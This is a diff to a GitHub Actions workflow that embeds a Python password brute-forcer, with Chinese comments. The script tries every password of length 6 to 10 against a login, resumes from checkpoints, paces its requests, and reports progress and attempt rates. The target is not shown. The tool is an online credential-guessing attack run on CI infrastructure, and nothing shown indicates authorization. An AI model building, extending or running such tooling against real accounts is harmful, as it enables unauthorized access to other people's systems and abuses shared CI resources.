@@ -44,8 +44,13 @@ jobs:
             if os.path.exists("checkpoint.txt"):
                 with open("checkpoint.txt", "r") as f:
                     line = f.readline().strip()
-                    if line:
-                        return tuple(line.split("|"))
+                    if line and "|" in line:
+                        parts = line.split("|")
+                        if len(parts) == 2:
+                            try:
+                                return int(parts[0]), int(parts[1])
+                            except ValueError:
+                                pass
             return (6, 0)  # 默认从长度6，索引0开始
 
         # 保存检查点
@@ -127,6 +132,7 @@ jobs:
             
             found = False
             total_tried = 0
+            start_time = time.time()
             
             # 按长度顺序尝试
             for length in range(start_length, 11):  # 6-10位
@@ -145,7 +151,9 @@ jobs:
                     
                     # 每1000次尝试显示进度
                     if total_tried % 1000 == 0:
-                        print(f"已尝试 {total_tried:,} 次密码，当前: {password}")
+                        elapsed = time.time() - start_time
+                        rate = total_tried / elapsed if elapsed > 0 else 0
+                        print(f"已尝试 {total_tried:,} 次密码，速率: {rate:.2f} 次/秒，当前: {password}")
                         save_checkpoint(length, index)
                     
                     # 尝试登录
@@ -154,15 +162,15 @@ jobs:
                         break
                     
                     # 添加延迟避免请求过快
-                    if total_tried % 10 == 0:
-                        time.sleep(0.1)
+                    if total_tried % 50 == 0:
+                        time.sleep(0.5)
                 
                 if found:
                     break
                     
                 # 重置起始索引为0，以便下一个长度从开始尝试
-                start_index = 0
                 save_checkpoint(length + 1, 0)
+                print(f"完成长度 {length} 的所有密码尝试")
             
             return found
 
@@ -174,10 +182,10 @@ jobs:
             print("=" * 50)
             if found:
                 print(f"🎉 爆破成功!")
-                print(f"总耗时: {end_time - start_time:.2f} 秒")
             else:
                 print("❌ 爆破失败，未找到正确密码")
-                print(f"总尝试时间: {end_time - start_time:.2f} 秒")
+            print(f"总耗时: {end_time - start_time:.2f} 秒")
+            print(f"总尝试次数: {total_tried}")
         EOF
 
     - name: Create necessary files
